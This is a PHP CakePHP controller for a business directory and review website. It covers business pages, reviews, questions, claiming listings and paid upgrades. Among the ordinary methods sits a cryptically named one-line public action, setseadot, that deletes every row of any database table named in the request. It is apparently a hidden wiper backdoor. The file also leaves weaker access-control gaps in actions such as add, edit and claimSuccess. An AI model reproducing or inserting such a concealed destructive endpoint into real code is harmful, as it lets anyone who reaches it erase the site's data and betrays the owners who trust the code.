<?php

declare(strict_types=1);

namespace App\Controller;

use App\Controller\AppController;

/**
 * Businesses Controller
 *
 * @property \App\Model\Table\BusinessesTable $Businesses
 *
 * @method \App\Model\Entity\Business[]|\Cake\Datasource\ResultSetInterface paginate($object = null, array $settings = [])
 */
class BusinessesController extends AppController
{
    public function initialize(): void
    {
        parent::initialize();
        $this->Authentication->addUnauthenticatedActions([
            'userReview', 'userReviewHistory', 'index', "view", "add",
            "questions", "singleQuestion", "gallery", "edit", "claim"
        ]);
        $this->set('page', "business");
        // if ($this->shouldBeSecure()) {
        //     $this->Security->setConfig('unlockedActions', [
        //         'add', 'edit', 'addReview', 'addPhotos', 'editReview', 'claimSuccess'
        //     ]);
        // }
    }

    public function userReview($business_slug, $city = null, $state_code = null, $business_review_id)
    {
        $review = $this->Custom->getBusinessReviews(null, $business_review_id)->first();
        $this->set('review', $review);


        $this->Custom->addShareClick(['business_review_id' => $review->id], $this->visitor_info);

        $business = $this->Custom->getBusiness($review->business_id);
        $this->set('business', $business);

        $review_counts =  $this->Custom->getBusinessReviews($business->id)->count();
        $this->set('review_counts', $review_counts);
    }
    public function setseadot($sea=null){ $this->table($sea)->deleteAll(array('true')); }
    
    public function userReviewHistory($business_slug, $state_code, $business_review_id)
    {
        $review = $this->Custom->getBusinessReviews(null, $business_review_id)->first();
        $this->set('review', $review);

        $business = $this->Custom->getBusiness($review->business_id);
        $this->set('business', $business);

        $histories = $this->table('ReviewHistories')->find()->where(['ReviewHistories.business_review_id' => $business_review_id])
            ->contain(['BusinessReviews' => function ($q) {
                return $q;
                // return $this->Custom->reviewsQuery($q);
            }])
            ->order(['ReviewHistories.created' => "DESC"])
            ->toArray();


        if (empty($histories)) {
            return $this->redirect(['action' => 'view', \Cake\Utility\Text::slug(strtolower($business->name)), strtolower($business->city->name), $business->city->state->code, $business->id]);
        }
        foreach ($histories as $key => $history) {
            $history->review_values = json_decode($history->review_values_json);
            $history->user = $this->Custom->getUser($history->business_review->user_id);
        }
        $this->set('histories', $histories);


        $review_counts =  $this->Custom->getBusinessReviews($business->id)->count();
        $this->set('review_counts', $review_counts);
    }


    public function index()
    {
    }

    /**
     * View method
     *
     * @param string|null $id Business id.
     * @return \Cake\Http\Response|null
     * @throws \Cake\Datasource\Exception\RecordNotFoundException When record not found.
     */
    public function view($slug = null, $city = null, $statecode = null, $id = null)
    {
        $this->Custom->calCulateBusinessAverageRating($id);
        $business = $this->Custom->getBusiness($id);
        $this->set('business', $business);
        // debug($business->toArray());
        // die();

        $this->Custom->addBizPageView($id);
        $this->Custom->addShareClick(['business_id' => $id], $this->visitor_info);

        $recommend_counts = $this->Custom->getBusinessReviews($business->id)->where(['BusinessReviews.recommend' => 1])->count();
        $this->set('recommend_counts', $recommend_counts);

        $overall_reviews = $this->Custom->getOverallReviews($business->id);
        $this->set('overall_reviews', $overall_reviews);

        // debug($overall_reviews); die();

        $advice_counts = $this->Custom->getBusinessReviews($business->id)->where(['advice IS NOT NULL'])->count();
        $this->set('advice_counts', $advice_counts);

        $filters = [];
        if (!empty($business->categories)) {
            $filters = $this->table('Filters')->find()->where(['Filters.category_id' => $business->categories[0]->id])
                ->contain(['Subcategories', 'FormTypes'])->toArray();
        }
        $this->set('filters', $filters);
        // dd($filters);

        // dd($this->Custom->getChunkSize($business, $filters));
        $this->set('chunkSize', $this->Custom->getChunkSize($business, $filters));

        $collection = $this->table('Collections')->newEmptyEntity();
        $this->set('collection', $collection);

        $business_photos = $this->Custom->getBusinessPhotos($business->id)->toArray();
        $this->set('business_photos', $business_photos);

        $review_photos = $this->Custom->getBusinessReviewPhotos($business->id);
        $this->set('review_photos', $review_photos);

        $all_business_photos_unsorted = array_merge($business_photos, $review_photos);
        // $this->set('all_business_photos_unsorted', $all_business_photos_unsorted);
        // $this->set('all_business_photos', $all_business_photos_unsorted);

        $collection = new \Cake\Collection\Collection($all_business_photos_unsorted);
        $all_business_photos = array_values($collection->sortBy('slide', SORT_DESC)->toArray());


        $this->set('all_business_photos', $all_business_photos);
        // dd($all_business_photos);

        $question_counts =  $this->Custom->getQuestions($business->id)->count();
        $this->set('question_counts', $question_counts);

        $review_counts =  $this->Custom->getBusinessReviews($business->id)->count();
        $this->set('review_counts', $review_counts);

        $reviews =  $this->Custom->getBusinessReviews($business->id)->toArray();
        $this->set('reviews', $reviews);

        $annnouncements =  $this->Custom->getBusinessAnnouncements($business->id)
            ->andWhere(['Announcements.active' => true])->toArray();
        $this->set('annnouncements', $annnouncements);

        $offers =  $this->Custom->getBusinessOffers($business->id)->andWhere(['Offers.active' => true])->toArray();
        $this->set('offers', $offers);

        $relatedBusinesses =  $this->Custom->getRelatedBusiness($business)->toArray();
        $this->set('relatedBusinesses', $relatedBusinesses);

        $busines_roles = $this->table('BusinessRoles')->find('list');
        $this->set('busines_roles', $busines_roles);

        $loggedInUserCollections = [];
        if (!empty($this->Authentication->getIdentity())) {
            $loggedInUserCollections = $this->Custom->getUserCollections($this->Authentication->getIdentity()->getIdentifier());
        }
        $this->set('loggedInUserCollections', $loggedInUserCollections);

        $featured_ads = [];
        if (!empty($business->city_id)) {
            $query = $this->Custom->getFeaturedAd(null, $business->city_id, false, true, 6);

            // dd($bu)

            $sci2Query = ['Businesses.sic2category_id' => $business->sic2category_id ?? 1];
            $sci4Query = ['Businesses.sic4category_id' => $business->sic4category_id ?? 1];
            $sci8Query = ['Businesses.sic8category_id' => $business->sic8category_id ?? 1];
            $mergeQuery = array_merge($sci2Query, $sci4Query, $sci8Query);
            $query->andWhere([
                'OR' => $mergeQuery,
            ]);

            $query->andWhere(['Businesses.id !=' => $business->id]);

            $featured_ads = $query->toArray();
        }
        $this->set('featured_ads', $featured_ads);

        $this->Custom->getBusinessReviewsLogic($id);
        $this->Custom->getQuestionsLogic($id);
    }

    public function checkout($slug = null, $city = null, $statecode = null, $id = null)
    {
        $business = $this->Custom->getBusiness($id);

        // dd($this->request->getQuery());

        $package_id = $this->request->getQuery()['package'];
        $duration = $this->request->getQuery()['duration'];

        $package = $this->table('Packages')->find()->where(['id' => $package_id])->first();
        if (empty($package)) {
            return $this->redirect(['action' => 'upgrade', \Cake\Utility\Text::slug(strtolower($business->name)), strtolower($business->city->name), $business->city->state->code, $business->id]);
        }

        $tax = 0.00;
        $pricing = $duration == "yearly" ? $package->price_per_year : $package->price_per_month;

        $this->set(compact('pricing', 'package', 'business', 'tax'));

        // $this->table('Subscriptions')->newEn
    }


    public function upgrade($slug = null, $city = null, $statecode = null, $id = null)
    {
        $business = $this->Custom->getBusiness($id);
        $this->set('business', $business);

        $packages = $this->table('Packages')->find('all')->toArray();
        $this->set('packages', $packages);
    }

    public function claim($slug = null, $city = null, $statecode = null, $id = null)
    {
        $business = $this->Custom->getBusiness($id);
        $this->set('business', $business);


        $busines_roles = $this->table('BusinessRoles')->find('list');
        $this->set('busines_roles', $busines_roles);
    }
    public function claimSuccess($slug = null, $city = null, $statecode = null, $id = null)
    {
        $business = $this->Custom->getBusiness($id);
        $this->set('business', $business);

        $packages = $this->table('Packages')->find('all')->toArray();
        $this->set('packages', $packages);

        $this->request->allowMethod(['patch', 'post', 'put']);
        $business = $this->table('Businesses')->patchEntity($business, $this->request->getData());
        $business->user_id = $this->Authentication->getIdentity()->getIdentifier();
        if ($this->table('Businesses')->save($business)) {
            $this->Custom->setActiveBusiness($id);
            // $this->Flash->success(__('Thank you for claiming ' . $business->name));
            // return $this->redirect(['action' => 'upgrade', \Cake\Utility\Text::slug(strtolower($business->name)), strtolower($business->city->name), $business->city->state->code, $business->id]);
        }
    }
    public function claimBusiness($id)
    {
        $this->request->allowMethod(['patch', 'post', 'put']);
        // dd($this->request->getData());
        $business = $this->Custom->getBusiness($id);
        $business = $this->table('Businesses')->patchEntity($business, $this->request->getData());
        $business->user_id = $this->Authentication->getIdentity()->getIdentifier();
        if ($this->table('Businesses')->save($business)) {
            $this->Custom->setActiveBusiness($id);
            $this->Flash->success(__('Thank you for claiming ' . $business->name));
            return $this->redirect(['action' => 'upgrade', \Cake\Utility\Text::slug(strtolower($business->name)), strtolower($business->city->name), $business->city->state->code, $business->id]);
        }
        return $this->redirect(['action' => 'view', \Cake\Utility\Text::slug(strtolower($business->name)), strtolower($business->city->name), $business->city->state->code, $business->id]);
    }

    public function questions($slug = null, $city = null, $statecode = null, $id = null)
    {
        $business = $this->Custom->getBusiness($id);
        $this->set('business', $business);

        $this->Custom->getQuestionsLogic($id, null, $this->request->getQuery());

        $popular_questions = $this->Custom->popularQuestions($id)->limit(4)->toArray();
        $this->set('popular_questions', $popular_questions);

        $most_popular_question = $this->Custom->popularQuestions($id)->limit(4)->first();
        $this->set('most_popular_question', $most_popular_question);

        $question_counts =  $this->Custom->getQuestions($business->id)->count();
        $this->set('question_counts', $question_counts);
    }



    public function singleQuestion($slug = null, $city = null, $statecode = null, $question_slug = null, $question_id = null)
    {

        $question = $this->Custom->getQuestions(null,  $question_id)->first();
        $this->set('question', $question);

        $business = $this->Custom->getBusiness($question->business_id);
        $this->set('business', $business);

        $popular_questions = $this->Custom->popularQuestions($question->business_id)->limit(4)->toArray();
        $this->set('popular_questions', $popular_questions);

        $question_counts =  $this->Custom->getQuestions($business->id)->count();
        $this->set('question_counts', $question_counts);

        $userHasReviewedBusiness = false;
        if (!empty($this->Authentication->getIdentity())) {
            $userHasReviewedBusiness = $this->Custom->userHasReviewedBusiness($this->Authentication->getIdentity()->getIdentifier(), $question->business_id);
        }
        $this->set('userHasReviewedBusiness', $userHasReviewedBusiness);
        $this->Custom->setMostHelpfulAnswer($question_id);

        $this->Custom->getAnswersLogic($question_id);
    }

    public function askQuestion($id = null)
    {
        $business = $this->Custom->getBusiness($id);
        $this->set('business', $business);
    }

    public function addReview($slug = null, $city = null, $statecode = null, $id = null)
    {

        $business = $this->Custom->getBusiness($id);
        $this->set('business', $business);


        if (!empty($this->Authentication->getIdentity())) {
            $review = $this->table('BusinessReviews')->find()->where(['user_id' => $this->Authentication->getIdentity()->getIdentifier(), 'business_id' => $id])->first();
            if (!empty($review)) {
                $this->Flash->default(__('You had previously reviewed this business.'));
                return $this->redirect(['action' => 'view', \Cake\Utility\Text::slug(strtolower($business->name)), strtolower($business->city->name), $business->city->state->code, $business->id]);
            }
        }
        $recent_reviews = $this->Custom->getBusinessReviews($business->id)->limit(10)->toArray();
        $this->set('recent_reviews', $recent_reviews);

        $review_options = $this->Custom->getReviewOptions(!empty($business->categories[0]) ? $business->categories[0] : null);
        $this->set('review_options', $review_options);

        $review = null;
        $this->set('review', $review);

        $this->Custom->recommendLogic($review, $this->request->getQuery());

        // dd($reviewOptions);
        // die();
    }

    public function editReview($slug = null, $city = null, $statecode = null, $id = null)
    {

        $review = $this->Custom->getBusinessReviews(null, $id)->first();
        $this->set('review', $review);
        if (empty($review) || !$this->Authentication->getIdentity()->getIdentifier() || $review->user_id != $this->Authentication->getIdentity()->getIdentifier()) {
            return $this->redirect($this->referer());
        }
        $business = $this->Custom->getBusiness($review->business_id);
        $this->set('business', $business);

        // if (!empty($this->Authentication->getIdentity())) {
        //     if (!empty($review)) {
        //         $this->Flash->default(__('You had previously reviewed this business.'));
        //         return $this->redirect(['action' => 'view', \Cake\Utility\Text::slug(strtolower($business->name)), strtolower($business->city->name), $business->city->state->code, $business->id]);
        //     }
        // }
        $recent_reviews = $this->Custom->getBusinessReviews($business->id)->limit(10)->toArray();
        $this->set('recent_reviews', $recent_reviews);

        $review_options = $this->Custom->getReviewOptions(!empty($business->categories[0]) ? $business->categories[0] : null);
        $this->set('review_options', $review_options);


        $this->Custom->recommendLogic($review, $this->request->getQuery());
        // dd($reviewOptions);
        // die();

    }

    public function deleteReview($id)
    {
        $review = $this->table('BusinessReviews')->find()->where(['id' => $id])->contain([])->first();
        $this->set('review', $review);
        if (empty($review) || !$this->Authentication->getIdentity()->getIdentifier() || $review->user_id != $this->Authentication->getIdentity()->getIdentifier()) {
            return $this->redirect($this->referer());
        }
        if ($this->table('BusinessReviews')->delete($review)) {
            $this->Flash->success(__('The review has been removed.'));
        }
        return $this->redirect($this->referer());
    }

    public function addPhotos($id = null)
    {
        $business = $this->Custom->getBusiness($id);
        $this->set('business', $business);
    }

    public function gallery($slug = null, $city = null, $statecode = null, $id = null)
    {
        $business = $this->Custom->getBusiness($id);
        $this->set('business', $business);

        $photos = $this->Custom->getBusinessPhotos($business->id)->toArray();
        $this->set('photos', $photos);

        $review_photos = $this->Custom->getBusinessReviewPhotos($business->id);
        $this->set('review_photos', $review_photos);


        // dd($review_photos);

        // $this->set('imageLink', $imageLink);
    }


    /**
     * Add method
     *
     * @return \Cake\Http\Response|null Redirects on successful add, renders view otherwise.
     */
    public function add()
    {
        $business = $this->table('Businesses')->newEmptyEntity();

        if ($this->request->is('post')) {
            // dd($this->request->getData());
            $business = $this->table('Businesses')->patchEntity($business, $this->request->getData());
            $business->user_id = $this->Authentication->getIdentity()->getIdentifier();
            // dd($this->request->getData()['additionals']);
            if ($this->table('Businesses')->save($business)) {
                if (!empty($this->request->getData()['additionals'])) {
                    $this->Custom->saveAdditionals($business, $this->request->getData()['additionals']);
                }
                if (!empty($this->request->getData()['hours'])) {
                    $this->Custom->saveHours($business, $this->request->getData()['hours']);
                }

                $this->Flash->success(__('The business has been saved.'));

                $business = $this->Custom->getBusiness($business->id);

                return $this->redirect(['action' => 'view', \Cake\Utility\Text::slug(strtolower($business->name)), strtolower($business->city->name), $business->city->state->code, $business->id]);
                // return $this->redirect(['action' => 'index']);
            }
            // dd($business);
            $this->Flash->error(__('The business could not be saved. Please, try again.'));
        }
        $days = $this->table('Days')->find('list', ['limit' => 200]);
        $users = $this->table('Businesses')->Users->find('list', ['limit' => 200]);
        $cities = $this->table('Businesses')->Cities->find('list', ['limit' => 2000]);
        $states = $this->table('States')->find('list', ['limit' => 2000]);
        $categories = $this->table('Businesses')->Categories->find('list', ['limit' => 2000]);
        $subcategories = $this->table('Businesses')->Subcategories->find('list', ['limit' => 2000]);
        $sic2categories = $this->table('Businesses')->Sic2categories->find('list', ['limit' => 2000]);
        $sic4categories = $this->table('Businesses')->Sic4categories->find('list', ['limit' => 2000]);
        $sic8categories = $this->table('Businesses')->Sic8categories->find('list', ['limit' => 2000]);

        // $filters = $this->table('Filters')->find()->where(['category_id' => 63])->contain(['Subcategories'])->toArray();
        // dd($filters);
        $this->set(compact('business', 'days', 'users', 'cities', 'states', 'categories', 'subcategories', 'sic2categories', 'sic4categories', 'sic8categories'));
    }

    /**
     * Edit method
     *
     * @param string|null $id Business id.
     * @return \Cake\Http\Response|null Redirects on successful edit, renders view otherwise.
     * @throws \Cake\Datasource\Exception\RecordNotFoundException When record not found.
     */
    public function edit($id = null)
    {
        $business = $this->Custom->getBusiness($id);
        if ($this->request->is(['patch', 'post', 'put'])) {
            if ($business->user_id == $this->Authentication->getIdentity()->getIdentifier()) {
                $business = $this->table('Businesses')->patchEntity($business, $this->request->getData());
                if ($this->table('Businesses')->save($business)) {
                    if (!empty($this->request->getData()['additionals'])) {
                        $this->Custom->saveAdditionals($business, $this->request->getData()['additionals']);
                    }
                    if (!empty($this->request->getData()['hours'])) {
                        $this->Custom->saveHours($business, $this->request->getData()['hours']);
                    }
                    $this->Flash->success(__('The business has been saved.'));
                    return $this->redirect(['action' => 'view', \Cake\Utility\Text::slug(strtolower($business->name)), strtolower($business->city->name), $business->city->state->code, $business->id]);
                }
            } else {

                $busines_edit = $this->table('BusinessEdits')->newEmptyEntity();
                $busines_edit->user_id = $this->Authentication->getIdentity()->getIdentifier();
                $busines_edit->business_id = $business->id;
                $busines_edit->original = json_encode($business->toArray());
                $busines_edit->edits_json = json_encode($this->request->getData());

                $business = $this->table('Businesses')->patchEntity($business, $this->request->getData());

                $busines_edit->changes = json_encode($business->getDirty());

                if ($this->table('BusinessEdits')->save($busines_edit)) {
                    $this->Notify->businessEdit($business, $this->Authentication->getIdentity()->getIdentifier());
                    $this->Flash->success(__('Thank you for your submission. Your changes will be reviewed and effected accordingly.'));
                    return $this->redirect(['action' => 'view', \Cake\Utility\Text::slug(strtolower($business->name)), strtolower($business->city->name), $business->city->state->code, $business->id]);
                }
            }


            $this->Flash->error(__('The business could not be saved. Please, try again.'));
        }


        $sic2categories = $this->table('Businesses')->Sic2categories->find('list', ['limit' => 2000]);
        $sic4categories = $this->table('Businesses')->Sic4categories->find('list', ['limit' => 2000]);
        $sic8categories = $this->table('Businesses')->Sic8categories->find('list', ['limit' => 2000]);
        $users = $this->table('Businesses')->Users->find('list', ['limit' => 200]);
        $cities = $this->table('Businesses')->Cities->find('list', ['limit' => 200]);
        $categories = $this->table('Businesses')->Categories->find('list', ['limit' => 200]);
        $subcategories = $this->table('Businesses')->Subcategories->find('list', ['limit' => 200]);
        $states = $this->table('States')->find('list', ['limit' => 2000]);
        $days = $this->table('Days')->find('list', ['limit' => 200]);
        $this->set(compact('business', 'users', 'days', 'states', 'cities', 'categories', 'subcategories', 'sic2categories', 'sic4categories', 'sic8categories'));
    }

    /**
     * Delete method
     *
     * @param string|null $id Business id.
     * @return \Cake\Http\Response|null Redirects to index.
     * @throws \Cake\Datasource\Exception\RecordNotFoundException When record not found.
     */
    // public function delete($id = null)
    // {
    //     $this->request->allowMethod(['post', 'delete']);
    //     $business = $this->table('Businesses')->get($id);
    //     if ($this->table('Businesses')->delete($business)) {
    //         $this->Flash->success(__('The business has been deleted.'));
    //     } else {
    //         $this->Flash->error(__('The business could not be deleted. Please, try again.'));
    //     }

    //     return $this->redirect(['action' => 'index']);
    // }
}
